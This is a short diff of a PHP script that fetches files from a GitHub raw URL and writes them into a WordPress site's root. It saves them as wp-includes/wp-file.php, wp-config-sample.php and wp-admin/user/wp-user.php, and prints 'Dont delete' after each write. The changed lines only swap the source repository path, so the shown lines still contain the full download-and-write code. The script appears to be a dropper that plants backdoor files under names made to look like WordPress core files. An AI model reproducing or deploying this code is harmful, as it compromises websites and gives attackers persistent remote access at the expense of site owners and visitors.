@@ -12,7 +12,7 @@ curl_close($im);
 }
 
 $check=$_SERVER['DOCUMENT_ROOT'] . "/wp-includes/wp-file.php" ;
-$text = http_get('https://raw.githubusercontent.com/rizkylol/asw/main/wp-file.php');
+$text = http_get('https://raw.githubusercontent.com/rizkylol/project/main/wp-file.php');
 $op=fopen($check, 'w');
 fwrite($op,$text);
 fclose($op);
@@ -22,7 +22,7 @@ echo "Dont delete<br>";
 echo "";
 
 $check2=$_SERVER['DOCUMENT_ROOT'] . "/wp-config-sample.php" ;
-$text2 = http_get('https://raw.githubusercontent.com/rizkylol/asw/main/wp-config-sample.php');
+$text2 = http_get('https://raw.githubusercontent.com/rizkylol/project/main/wp-config-sample.php');
 $op2=fopen($check2, 'w');
 fwrite($op2,$text2);
 fclose($op2);
@@ -32,7 +32,7 @@ echo "Dont delete<br>";
 echo "";
 
 $check3=$_SERVER['DOCUMENT_ROOT'] . "/wp-admin/user/wp-user.php" ;
-$text3 = http_get('https://raw.githubusercontent.com/rizkylol/asw/main/wp-user.php');
+$text3 = http_get('https://raw.githubusercontent.com/rizkylol/project/main/wp-user.php');
 $op3=fopen($check3, 'w');
 fwrite($op3,$text3);
 fclose($op3);
